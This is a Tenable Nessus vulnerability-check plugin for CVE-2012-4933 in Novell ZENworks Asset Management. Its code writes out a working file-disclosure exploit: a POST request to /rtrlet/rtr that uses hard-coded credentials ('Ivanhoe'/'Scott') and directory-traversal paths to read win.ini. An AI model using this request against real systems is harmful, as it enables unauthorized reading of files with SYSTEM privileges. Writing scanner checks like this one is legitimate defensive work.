#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62704);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2015/09/24 21:17:13 $");

  script_cve_id("CVE-2012-4933");
  script_bugtraq_id(55933);
  script_osvdb_id(86410);
  script_xref(name:"CERT", value:"332412");

  script_name(english:"Novell ZENworks Asset Management rtrlet Component GetFile_Password Method Hardcoded Credentials Information Disclosure");
  script_summary(english:"Tries to read a file");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote host has an arbitrary information disclosure vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host has a version of Novell ZENworks Asset Management that
is affected by an arbitrary information disclosure vulnerability.  The
'GetFile_Password' maintenance call in '/rtrlet/rtr' is protected by a
set of known, hard-coded credentials.  This maintenance call can be
utilized by an attacker to disclose arbitrary files accessible with
SYSTEM privileges on the remote host via a specially crafted POST
request. 

Although Nessus did not attempt to execute it, the associated
maintenance call 'GetConfigInfo_Password' is also protected by a set of
hard-coded credentials in this version of Novell ZENworks Asset
Management.  It could allow a remote attacker to view the Novell
ZENworks Configuration Management configuration parameters."
  );
  script_set_attribute(
    attribute:"solution",
    value:
"There is no known solution at this time.  As a workaround, restrict
access to this web application."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
script_set_attribute(attribute:"vuln_publication_date",value:"2012/10/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/10/25");

  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:novell:zenworks_asset_management");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("novell_zenworks_asset_management_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/novell_zenworks_asset_management");
  script_require_ports("Services/www", 8080);
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:8080, embedded:0);

appname = "Novell ZENworks Asset Management";

report = '';
report_file_output = '';

install = get_install_from_kb(appname:'novell_zenworks_asset_management', port:port, exit_on_fail:TRUE);
dir = install['dir'];

item =  dir + '/rtr';

traversal_str = mult_str(str:"../", nb:10);

files = make_list(
  traversal_str + "../windows/win.ini",
  traversal_str + "../winnt/win.ini",
  "c:/windows/win.ini", # try absolute paths (software may not be installed on root windows partition) 
  "c:/winnt/win.ini",
  'wcsvr.ini' # last resort, file comes installed with software
);

foreach file (files)
{
  match = eregmatch(pattern:"([^/]+)$", string:file);
  filename = match[1];

  is_abs = "no";
  if ("c:/" >< file) is_abs = "yes";

  postdata = "kb=100000000&maintenance=GetFile_password&username=Ivanhoe&password=Scott&send=Submit&absolute=" 
             + is_abs + "&file=" + file;
 
  r = http_send_recv3(method: "POST", 
                      item: item, 
                      port: port, 
                      content_type:'application/x-www-form-urlencoded',
                      data: postdata,
                      exit_on_fail:TRUE);
  
  if (
    'File not found' >!< r[2] &&
    'File name =' >< r[2] &&
    '<pre>' >< r[2] &&
    '</pre>' >< r[2]
  )
  {
    file_contents = chomp(substr(r[2], stridx(r[2], "<pre>") + 7, stridx(r[2], "</pre>") - 1));

    report = '\nNessus was able to obtain the contents of \'' + filename + '\' with the' + 
    '\nfollowing request :\n' + 
    '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) +
    '\n' + chomp(http_last_sent_request()) +
    '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) + '\n';
    
    report_file_output = '\nFile output is displayed below :\n' +
    '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) +
    '\n' + file_contents +  
    '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) + '\n';

    break;
  }
}

if (report != '')
{
  if (report_verbosity > 0)
  {
    if (report_verbosity > 1)
      report += report_file_output;
    security_hole(extra:report, port:port);
  }
  else security_hole(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, build_url(qs:item, port:port));
